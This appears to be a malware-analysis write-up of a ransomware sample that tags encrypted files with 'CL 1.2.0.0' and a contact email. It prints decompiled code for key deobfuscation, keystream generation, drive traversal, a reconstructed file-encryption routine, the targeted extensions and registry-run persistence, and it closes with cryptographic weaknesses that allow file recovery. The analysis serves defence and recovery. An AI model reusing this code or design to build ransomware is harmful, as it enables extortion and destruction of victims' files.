# The main function
start with copying 3 RSA public keys into 3 seperate variables and obfuscating them with concatenating something like 13G13G....</br> 
There is 3 blocks of code like this , each one for an RSA key  
```C
copy(
    (volatile signed __int32 *)&RSA_KEY_1,
    (signed __int32)"8218573558423868576763286162417727488729356553874144436243558385082013292018314269999051321143121835"
                    "1515869551667585525921751268860153332622085268097015158687030691773886056780852269841267506558244411");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "03484117901192362044107373706299647832760503989379610949620903289961076922047235709569442148351776390771045819406380"
    "727053579573045429371687056037657759416374532634792426441798055715624726414878656648");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "97932057208863804097317380182557626120092371160971366025152017122881832224591456521412041436352424715545408606242333"
    "615724802894715060374899930748348693104568782083465816005355018530243731351021765414");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "1746100718072807:65537|||13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G1"
    "3G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G13G1");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G1"
    "4G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G14G1");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G1"
    "5G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G15G1");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G1"
    "6G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G16G1");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G1"
    "7G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G17G1");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G1"
    "8G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G18G1");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G1"
    "9G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G19G1");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110"
    "G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110G110");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111"
    "G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111G111");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112"
    "G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112G112");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113"
    "G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113G113");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114"
    "G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114G114");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115"
    "G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115G115");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116"
    "G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116G116");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117"
    "G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117G117");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118"
    "G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118G118");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119"
    "G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119G119");
  copy_to_address(
    (char **)&RSA_KEY_1,
    "G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120"
    "G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120G120");
```
After This the malware will call 2 functions to remove the concatened random string <br/><br/>
```c 
v2 = length_of_good_data((_BYTE *)def, (_BYTE *)RSA_KEY_1); // look where ||| start 
  keep_good_data(RSA_KEY_1, 1, (int)(v2 - 1), (char **)&RSA_KEY_1); // removing everything from ||| to the end 
```
It will do this 2 more times </br>
Public keys : <br/>
key1 : <br/>```8218573558423868576763286162417727488729356553874144436243558385082013292018314269999051321143121835
1515869551667585525921751268860153332622085268097015158687030691773886056780852269841267506558244411
03484117901192362044107373706299647832760503989379610949620903289961076922047235709569442148351776390771045819406380
727053579573045429371687056037657759416374532634792426441798055715624726414878656648
97932057208863804097317380182557626120092371160971366025152017122881832224591456521412041436352424715545408606242333
6157248028947150603748999307483486931045687820834658160053550185302437313510217654141746100718072807:65537 ```<br/>
key2 :<br/>```4372050014365306731665318876644049576237295145980325470433244938064878163614460265772360030641667318
1918633158563712416544618578249307294895202624079580191874460024499933472381883027218220456554995247
65158281214745718421265965989442504562394836294548216033955590900254939392369170497228950606445248805833582659669548
453902496538789520516235779898350051755771122652473634583693017585978107350613046507
46286697306922310714255768031863446183870422616732285912784282786501377105470022873925357301968061494307039417299358"
802372691417937010589796477887985234705396188080181574217253421725831596987526612984119150272153433:65537 ```<br/>
key3 :<br/>```1126048008758310315572083729673247664750217706440310384210425629270517516681654119401821441652672859
2250885693346405631902078278799322170358825905256814075226004951445616760965330764671293592279229722
22160196743305607106649317796986454753459601233200635881921575473627110125132446168309888011818714113680056574527396
080037359532723152575957056539345287927867505218040809140490765656786310534017742779
31993947586429667718985223045665309095957294692309771103410629132017241288155296515121849066713729856729622717014843
95040133896425327007320261010843739806058098358668173017378730321830022707681310903828104524796878143:65537```<br/>
We can notice that it's using a 65537 as exponent 

<br/>
This is the part where the malware will Create the data that will replace the name of the files after encryption 

```c 
copy(
    (volatile signed __int32 *)&email,
    (signed __int32)"vipasana4@aol.com|||KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"
                    "KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK");// 
  // 
  // 
  // 
  v5 = length_of_good_data((_BYTE *)def, (_BYTE *)email);
  keep_good_data(email, 1, (int)(v5 - 1), (char **)&email);
  *(double *)&time_date = sub_409BB0();
  sub_40A7E8(v7, (char **)&v65, time_date, time_date >> 32);
  copy((volatile signed __int32 *)&::time_date, v65);
  copy((volatile signed __int32 *)&CL_str, (signed __int32)"CL 1.2.0.0");// 
  ```
the name of files after encryption will contain email "vipasana4@aol.com" , <b>the Time and date</b> when the file were crypted and the string <b>"CL 1.2.0.0"</b> and (another random  2 generated string we will see them later ) <br/>
# Persistence
Now to the persistence part , The malware will try to copy itself to <b>C:\Program Files (x86)</b> and rerun the malware from there and kill the current process  <br/>
it's using the API <b>shellexecuteA</b> to Create the new process then killing the current one with <b>OpenProcess</b> ,<b>TerminateProcess</b> in function <b>sub_437FA4</b><br/>
<img src="shell.jpeg">

the new process will redo all the previous operations but it will check its location , this time its in "C:\Progam Files (x86)" so it will pass the creation of new process and  try to add new Key in the registry in <b>HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run</b> using the APIS <b>RegCreateKeyExA , RegSetValueExA</b>, this tells us that anytime the computer starts it will start the malware on any user , so  it will not just encrypt the current user files , All users will loose their files .


# Generation of some keys that will be used in encryption 
Detecting Encryption functions with <b>PEID </b>We see The RSA encryption and decryption functions , and after more digging into the code it looks like it makes sence that thoose are The Encryption an decryption Functions<br/><br/>
<img src="PEID.PNG"><br/><br/>
First the malware will Encrypt and Decrypt the String <b>"12345678900987654321" </b> using RSA (with a generated key of course not the one will be used in files encryption )to test maybe if the encryption is working as expected , The malware will then generate 2048 alphanum caracters based on an internal state that gets modified by checking the speed of Program, looks like its creating some sort of custom pseudo random Number generator and (maybe defeating the debugger since program execution in debugger in slower !! ) but there is ways to defeat that ,using maybe some Hooking technique  
```c
do
  {// generating 2048 caracter , 
  // 
    checking_for_speed_of_program();
    if ( Generating(2u) )
    {
      if ( Generating(2u) )
      {
        checking_for_speed_of_program(); // 
        v34 = Generating(0x1Au);
        LOBYTE(v34) = v34 + 65;
        copy_generated_caracter_0(v35, v34, (char **)&v45);
        sub_407EE4(v36, &v46, v45);
        copy_to_address((char **)&GENERATED_2048, v46);
      }
      else
      {
        checking_for_speed_of_program();
        v32 = Generating(0x1Au);
        LOBYTE(v32) = v32 + 65;
        copy_generated_caracter_0(v33, v32, &v47);
        copy_to_address((char **)&GENERATED_2048, v47);
      }
    }
    else
    {
      checking_for_speed_of_program();
      v31 = Generating(0xAu);
      copy_generated_caracter(v31, &v48);
      copy_to_address((char **)&GENERATED_2048, v48);
    }
    ++v30;
  }
  while ( v30 != 2049 );// // end generation
```

Then it will generate another 20 caracters (which is actually a static global key stream )but this time just numbers using the same random generation technique 

```c 
do
  {// generating 20 caracter 
  // 
    checking_for_speed_of_program();// changing an internal state for generating the next caracter
    v38 = Generating(0xAu);
    copy_generated_caracter(v38, &v44);
    copy_to_address((char **)&state_20_caracters, v44);
    ++v37;
  }
  while ( v37 != 21 );// End Generating
  ```
  The malware will also generate a Number in this form lets call it Random1: 
  ```
  9580869180839488118104447977618747762973227141078034274945
84848858571454234835252812151574043819299558540990127602826482640
83399579175011501637106300228807561395435645947875270290364441574
88594948828652112995969754803490438215708032744873575513394329208
65241155744202696878255477766492447447258272357391388434057407943
29794169987488678692552998052474558424240649209115420473435126182
56815952884375441391418807764090981381894928435721605717060500541
46534762363511664510146624605347182785574012335036317713231013769
88873642981068823787311566578580525514877018819241645432939568825
98964987783953921571523465186326556421:38247750183606745446689148
48687600862454316518791287528196411706469140326402794561747458936
43414320679159984813288260818550317222819164109726922442609958693
90249611407371931286091929824143975786143125871680472642430218612
43801784782042268144043165476526023056343399236333433907268383469
17047814489215045407862472784100860957305574240325805962130403363
89707251437139169517715688834978330606131237286576831852995073214
18971316974736748445861693435840267450645276465178811095334796100
10700915115701488130343161390600641290692691654996108644262879793
62915652191648111262710236801628481573501371339813098688399229152
```

After That we find the Function that will generate The Random 2 strings that we talked about earlier , it will be something like this :<br/>

```
LTWZDGILNPRTWYACEHJLNQRUWYADEHJLNQRU-4@4@2021 7@22@11 AM369703    lets name it str1
OGOMATVCDJ.EAA0
```
<br/>
Now the <b>random1</b> and the <b>2048 alphanum </b>and the <b>static global algo key stream </b>   will get encrypted with RSA with the 3 found first keys using this order key1 > key2 > key3  .

# Extensions 
The malware will set up the extensions of course like the keys they are obfuscated with "{}{}{}" it will split them into different addresses , the splitting caracter is ":"<br/>

<img src="extensions.jpeg">
<br/>


Now every file with thoose  extensions on all disks (We will see this part later ) will get encrypted :<br/>
<b>
.r3d ,rwl ,rx2 ,p12 ,sbs ,sldasm ,wps ,sldprt ,odc ,odb ,old ,nbd ,nx1 ,nrw ,orf ,ppt ,mov ,mpeg ,csv ,mdb ,cer ,arj ,ods ,mkv ,avi ,odt ,pdf ,docx ,gzip ,m2v ,cpt ,raw ,cdr ,cdx ,1cd ,3gp ,7z ,rar ,db3 ,zip ,xlsx ,xls ,rtf ,doc ,jpeg ,jpg ,psd ,ert ,bak ,xml ,cf ,mdf ,fil ,spr ,accdb ,abf ,a3d ,asm ,fbx ,fbw ,fbk ,bdb ,fbf ,max ,m3d ,dbf ,ldf ,keystore ,iv2i ,gbk ,gho ,sn1 ,sna ,spf ,sr2 ,srf ,srw ,tis ,tbl ,x3f ,ods ,pef ,pptm ,txt ,pst ,ptx ,pz3 ,mp3 ,odp ,qic ,wps . 
</b>
# Encryption
First it will loop over All alphabet letters(Maj and min ) Looking for available disks (Since in windows ,Disks are named by alphabet letters ) 
then for each letter it checks if that disk exists , if true it will append <b>":\\"</b>
```c
  GetWindowsDirectoryA(&Buffer, 0xFFu);
    counter = 0;
    do
    {//  looping through Drives names
    //starts encrypting other drives
    //
      copy_generated_caracter_0(v30, counter + 65, (char **)&v60);
      sub_407EE4(v32, (LPSTR *)&v61, v60);
      v33 = v61;
      LOBYTE(v34) = Buffer;
      copy_generated_caracter_0(v35, v34, (char **)&v58);
      sub_407EE4(v36, (LPSTR *)&a2, v58);
      str_cmp(v33, a2);
      if ( !v15 )
      {
        copy_generated_caracter_0(v30, counter + 65, (char **)&v57);
        copy_to_address((char **)&v57, (char *)str_path_backslash);
        Looping_through_file_to_encrypt(v57);
      }
      ++counter;
    }
    while ( counter != 26 );
```
then it will Call another function that will Loop over Files using APIs : <b>FindFirstFileA and FindNextFileA </b> thoose apis will return handle to the file then it will use <b>CreateFileA , ReadFileA</b> to Read content from the file .
### Encryption algorithm 
first we have the 2048 alphanum already generated and encrypted , it will generate another 512 bytes (thoose are positions in the 2048 alphanum), so with the 512 positions , we choose 512  caracters ( lets call it an internal state ) .the internal state is updated by this algorithm .

<img src="state.png">

this state is put into a PRNG and return a 30000 bytes (this is the key cipher stream ) , depending on the static global algo key stream we will choose an operation to do (there is 10 in total ) 

<img src="encryption.jpg">

the algorithme will be something like : 
```c

void encryptFileContent(uint8_t* fileContent, char* keystream, char *globalAlgoKey) // 004355f5
{
	for (int i = 0; i < 0x7530; i++) { // only the first 7530 byte are actually encrypted!
		char algo = globalAlgoKey[i % 20];
		char keystreamByte = (uint8_t)keystream[i];

		switch (algo) {
		case '0':
			fileContent[i] += keystreamByte;
			break;
		case '1':
			fileContent[i] -= keystreamByte;
			break;
		case '2':
			fileContent[i] += keystreamByte;
			fileContent[i] += 0x32;
			break;
		case '3':
			fileContent[i] += keystreamByte;
			fileContent[i] += 0x03;
			break;
		case '4':
			fileContent[i] -= keystreamByte;
			fileContent[i] -= 0x34;
			break;
		case '5':
			fileContent[i] -= keystreamByte;
			fileContent[i] -= 0x05;
			break;
		case '6':
			fileContent[i] += 0x06;
			break;
		case '7':
			fileContent[i] -= 0x07;
			break;
		case '8':
			fileContent[i] += 0x38;
			break;
		case '9':
			fileContent[i] -= 0x39;
			break;
		}
	}
}

```

The malware will change the name of the file after encryption to something like  : **email-vipasana4@aol.com.ver-CL-1.2.0.id-OGOMATVCDJ.EAA0-time-date-of-the-day** 
# Last part changing the Desktop image 
in the the end the malware will load an embedded image from it's ressource section with The API <b> LoadRessourceA </b> named DESK and set it on the victime background <br/>
<img src="DESK.jpg">
# Summary 
- The malware copies itself to C:\Program Files (x86) , adds a new registry key in
HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run for
persistence .
- It encrypts the first 30 000 bytes of the file , if the file is large enough we can recover
some informations .
- The times static global algo key contains 6 , 7 , 8 ,9 the key cipher will not even be used .
- Some windows files are encrypted , which means the possibility of plaintext attack on
the static global algo key .
- Some researchers on boxcryptor found that the keystream is converging after the first
768 bytes because of how the the internal state of the PRNG change , since the
update3 function will multiply the old state by 2 , after 8 times of calling update3 the
internal state will always be 0 , since the call of the internal state will be like this :
update1 -> update2 -> update3 -> update1 â€¦.. , and we call each update function after
generating 32 bytes of keystream , so update3 will be called after generating 96 bytes ,
96 * 8 = 768 , so after 768 bytes the keystream is known .
